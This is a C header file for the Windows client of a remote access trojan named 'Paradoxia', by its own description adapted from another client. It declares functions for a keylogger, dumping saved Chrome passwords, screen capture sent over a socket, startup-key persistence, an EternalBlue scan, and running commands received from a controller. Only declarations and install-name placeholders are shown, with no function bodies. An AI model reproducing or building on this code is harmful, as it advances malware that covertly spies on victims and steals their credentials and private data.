#ifndef __PARADOXIA__H__
#define __PARADOXIA__H__
/*
Author: Fahad (QuantumCore)
paradoxia.h (c) 2020
Desc: Main header file 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/


// This is the maalik client modified to work as a RAT client for paradoxia.
// Changes : 
// Some new commands added.
// Built in Keylogger.
// Built in Chrome Dump.

#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <wininet.h>
#include <shlwapi.h>
#include <shlobj.h>

#define INSTALL_NAME "{{installname}}"
#define INSTALL_FOLDER_NAME "{{installdir}}"


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winmm.lib")

#define BUFFER 1024
static BOOL connected = FALSE;


//=====================
void ReportError(void);
void WSAReportError(void);
char* appDataPath();
int CaptureAnImage(HWND hWnd, SOCKET sockfd);
void TimeStamp(char buffer[100]);
BOOL IsAdmin();
void OS();
void ramsize(int mode);
void SYSTEMINFO(int mode);
//=====================
void sockprintf(const char* words, ...);
char* ParadoxiaInfo();
BOOL isFile(const char* file);
void UserPC();
void EternalBlueScan(const char* host);
char* cDir();
// Start Winsock
void StartWSA(void);
void StartupKey(const char* czExePath);
void paradoxia_main(void);
void MainConnect(void);
void sockSend(const char* data);
DWORD ProcessId(LPCTSTR ProcessName);
void ExecSock(SOCKET sockfd, char recvbuf[BUFFER]);
static int process_row(void* passed_db, int argc, char** argv, char** col_name);
static int fill_secret_file(char* url, char* username, unsigned char* password);
void split(char* src, char* dest[5], const char* delimeter);
void REConnect();

#endif  //!__paradoxia__H__